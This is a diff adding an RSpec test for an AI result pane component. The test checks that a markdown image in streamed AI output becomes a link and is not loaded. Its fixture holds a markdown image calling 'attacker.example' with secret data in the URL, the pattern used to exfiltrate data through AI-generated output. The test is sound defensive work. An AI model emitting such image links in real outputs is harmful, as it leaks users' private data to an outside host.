@@ -74,6 +74,17 @@ RSpec.describe AI::TextTransforms::ResultPaneComponent::Body, type: :component d
     end
   end
 
+  context "with an image in the output" do
+    before do
+      run.events.build(kind: "text_delta", payload: { "delta" => " ![chart](https://attacker.example/?d=secret)" }, seq: 2)
+    end
+
+    it "links the image instead of loading it" do
+      expect(subject).to have_no_css("img", visible: :all)
+      expect(subject).to have_link("Image: chart", href: "https://attacker.example/?d=secret")
+    end
+  end
+
   context "for a new work package of a project" do
     let(:project) { create(:project, :with_internal_wiki).reload }
     let(:pane) { AI::TextTransforms::ResultPaneState.new(run:, scope:, request_id: SecureRandom.uuid, project:) }
